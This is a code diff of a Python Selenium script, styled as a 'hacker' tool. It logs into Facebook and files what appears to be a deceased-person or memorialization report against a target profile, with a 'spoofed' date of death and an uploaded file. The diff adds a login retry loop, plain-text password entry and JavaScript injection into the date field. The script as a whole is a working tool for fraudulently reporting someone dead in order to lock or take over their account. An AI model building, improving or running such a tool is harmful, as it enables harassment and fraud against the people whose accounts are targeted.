@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 import os
 import sys
-import getpass
 import time
 import random
 import string
@@ -17,7 +16,7 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 
 # ==========================================
-# 1. HACKER STYLE CONFIG
+# 1. STYLE & CONFIG
 # ==========================================
 R = "\033[91m"
 G = "\033[92m"
@@ -43,7 +42,7 @@ def banner():
               ░            ░  ░░ ░          ░  ░
                               ░                 
       {R}╔═══════════════════════════════════════════╗
-      ║    TERMUX EDITION • ULTIMATE DATE FIX     ║
+      ║     TERMUX EDITION • LOGIN LOOP FIX       ║
       ║         DEV BY: {Y}OTF x DJAMAL19{R}            ║
       ╚═══════════════════════════════════════════╝{X}
 """)
@@ -70,40 +69,22 @@ def type_human(element, text):
         time.sleep(random.uniform(0.05, 0.2))
 
 # ==========================================
-# 2. CONFIGURATION (NOUVEAU FORMAT DATE)
+# 2. CONFIGURATION CIBLE (On le fait une seule fois)
 # ==========================================
 banner()
-print(f"  {Y}[KERNEL] CHECKING PERMISSIONS...{X}\n")
+print(f"  {Y}[KERNEL] CONFIGURATION DE LA CIBLE...{X}\n")
 
 if not os.path.exists("/sdcard"):
-    print(f"  {R}[ERROR] ACCÈS STOCKAGE REFUSÉ. Tapez 'termux-setup-storage'{X}")
+    print(f"  {R}[ERROR] ACCÈS STOCKAGE REFUSÉ.{X}")
     exit()
-
-while True:
-    sys.stdout.write(f"  {C}root@termux:~# {X}SET LHOST_USER : {G}")
-    sys.stdout.flush()
-    EMAIL = input().strip()
-    print(f"{X}", end="") 
-    if EMAIL: break
-
-while True:
-    sys.stdout.write(f"  {C}root@termux:~# {X}SET LHOST_PASS : {G}")
-    sys.stdout.flush()
-    PASSWORD = getpass.getpass("").strip()
-    print(f"{X}", end="") 
-    if PASSWORD: break
-
-print(f"\n  {R}[SYSTEM] TARGET CONFIGURATION REQUIRED{X}")
 
 sys.stdout.write(f"  {C}root@termux:~# {X}SET RHOST_URL  : {G}")
 sys.stdout.flush()
 url_profil = input().strip()
 
-# --- MODIFICATION ICI : EXEMPLE CLAIR ---
 sys.stdout.write(f"  {C}root@termux:~# {X}SET DATE (Ex: 11/12/2005) : {G}")
 sys.stdout.flush()
 date_input = input().strip()
-# Si vide, on met la date d'aujourd'hui en format JJ/MM/AAAA
 date_deces = date_input if date_input else datetime.now().strftime("%d/%m/%Y")
 
 sys.stdout.write(f"  {C}root@termux:~# {X}SET BINARY_SRC : {G}")
@@ -127,13 +108,11 @@ print(f"\n  {Y}[*] STARTING FIREFOX ENGINE...{X}\n")
 driver = None
 try:
     loading(5, "LOCATING DRIVER...")
-
     gecko_path = "/data/data/com.termux/files/usr/bin/geckodriver"
     if not os.path.exists(gecko_path):
         gecko_path = "/usr/bin/geckodriver"
     
     service = Service(executable_path=gecko_path)
-    
     options = FirefoxOptions()
     options.add_argument("--headless") 
     options.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0")
@@ -141,40 +120,76 @@ try:
     loading(8, "INITIALIZING SERVICE...")
     driver = webdriver.Firefox(service=service, options=options)
     driver.set_window_size(1080, 2400)
-    
     wait = WebDriverWait(driver, 30)
 
-    # Navigation
-    loading(10, "CONNECTING TO META SERVERS...")
-    driver.get("https://www.facebook.com/")
-
-    # Cookies
-    try:
-        time.sleep(2)
-        cookie_btns = driver.find_elements(By.XPATH, "//button[contains(text(), 'Autoriser') or contains(text(), 'Accept') or contains(text(), 'Allow')]")
-        if cookie_btns:
-            cookie_btns[0].click()
-    except: pass
-
-    # Auth
-    loading(20, "INJECTING CREDENTIALS...")
-    try:
-        email_field = wait.until(EC.presence_of_element_located((By.NAME, "email")))
-        type_human(email_field, EMAIL)
-        time.sleep(0.5)
+    # ==========================================
+    # 🔥 BOUCLE DE CONNEXION (LOGIN LOOP) 🔥
+    # ==========================================
+    while True:
+        # On nettoie le terminal pour demander les infos
+        sys.stdout.write("\r" + " " * 80 + "\r")
+        print(f"\n  {Y}[AUTH] IDENTIFICATION REQUISE{X}")
         
-        pass_field = driver.find_element(By.NAME, "pass")
-        type_human(pass_field, PASSWORD)
-        
-        loading(35, "BYPASSING GATEWAY...")
+        # Saisie VISIBLE (plus de getpass)
+        EMAIL = input(f"  {C}[USER] Email : {G}").strip()
+        # Ici on utilise input simple, donc le mot de passe est VISIBLE
+        PASSWORD = input(f"  {C}[PASS] Pass  : {G}").strip() 
+        print(f"{X}", end="")
+
+        loading(10, "CONNECTING TO LOGIN PAGE...")
+        driver.get("https://www.facebook.com/")
+
+        # Cookies
         try:
-            driver.find_element(By.NAME, "login").click()
-        except:
-            pass_field.send_keys(Keys.ENTER)
-    except: pass
+            time.sleep(2)
+            cookie_btns = driver.find_elements(By.XPATH, "//button[contains(text(), 'Autoriser') or contains(text(), 'Accept') or contains(text(), 'Allow')]")
+            if cookie_btns: cookie_btns[0].click()
+        except: pass
 
-    loading(40, "VERIFYING SESSION...")
-    time.sleep(10)
+        loading(20, "INJECTING CREDENTIALS...")
+        try:
+            email_field = wait.until(EC.presence_of_element_located((By.NAME, "email")))
+            email_field.clear() # On vide au cas où c'est le 2ème essai
+            type_human(email_field, EMAIL)
+            
+            pass_field = driver.find_element(By.NAME, "pass")
+            pass_field.clear()
+            type_human(pass_field, PASSWORD)
+            
+            loading(35, "ATTEMPTING LOGIN...")
+            try:
+                driver.find_element(By.NAME, "login").click()
+            except:
+                pass_field.send_keys(Keys.ENTER)
+        except: pass
+
+        loading(40, "VERIFYING STATUS...")
+        time.sleep(5) # On attend la réponse du serveur
+
+        # VÉRIFICATION DU SUCCÈS OU DE L'ÉCHEC
+        current_url = driver.current_url
+        page_source = driver.page_source.lower()
+
+        # Si l'URL contient encore "login" ou s'il y a un message d'erreur
+        if "login_attempt" in current_url or "incorrect" in page_source or "pas le bon mot de passe" in page_source:
+            print(f"\n\n  {R}[!] ERREUR : Email ou Mot de passe incorrect !{X}")
+            print(f"  {Y}>> Redémarrage de la connexion...{X}")
+            time.sleep(2)
+            continue # ON REBOUCLE AU DÉBUT DU WHILE
+        
+        elif "checkpoint" in current_url or "two_step" in current_url:
+            print(f"\n  {R}[!] CHECKPOINT / 2FA DÉTECTÉ.{X}")
+            print(f"  {W}Validez le code sur votre appareil, puis appuyez sur Entrée.{X}")
+            input()
+            break # On sort de la boucle si 2FA passé
+            
+        else:
+            print(f"\n  {G}[SUCCESS] CONNEXION RÉUSSIE.{X}")
+            break # ON SORT DE LA BOUCLE, ON CONTINUE LE SCRIPT
+
+    # ==========================================
+    # SUITE DU SCRIPT (Formulaire)
+    # ==========================================
 
     # Formulaire
     loading(50, "RESOLVING TARGET NODE...")
@@ -190,14 +205,9 @@ try:
         url_field.send_keys(url_profil)
     except: pass
 
-    # ====================================================
-    # 🔥 CORRECTION DATE (DOUBLE FRAPPE + TAB) 🔥
-    # ====================================================
+    # Date
     loading(70, f"SPOOFING DATE ({date_deces})...")
     try:
-        # On utilise DIRECTEMENT la date saisie (Format JJ/MM/AAAA attendu)
-        
-        # Trouver le champ (Classe _3smp)
         date_field = None
         try:
             date_field = driver.find_element(By.CSS_SELECTOR, "input._3smp")
@@ -208,23 +218,14 @@ try:
         if date_field:
             date_field.click()
             time.sleep(0.5)
-            
-            # 1. On écrit
             date_field.send_keys(date_deces)
             time.sleep(0.5)
-            
-            # 2. On valide avec TAB (Important pour que Facebook détecte)
             date_field.send_keys(Keys.TAB)
-            time.sleep(0.5)
             
-            # 3. Sécurité : Si le champ est toujours vide, on force
-            current_val = date_field.get_attribute("value")
-            if not current_val:
-                # Injection JS si le clavier n'a pas marché
-                driver.execute_script(f"arguments[0].value = '{date_deces}';", date_field)
-            
-    except Exception as e: 
-        print(f"\n[DEBUG DATE] {e}")
+            # Securité JS si vide
+            if not date_field.get_attribute("value"):
+                 driver.execute_script(f"arguments[0].value = '{date_deces}';", date_field)
+    except Exception as e: pass
 
     # Upload
     loading(80, "UPLOADING BINARY...")
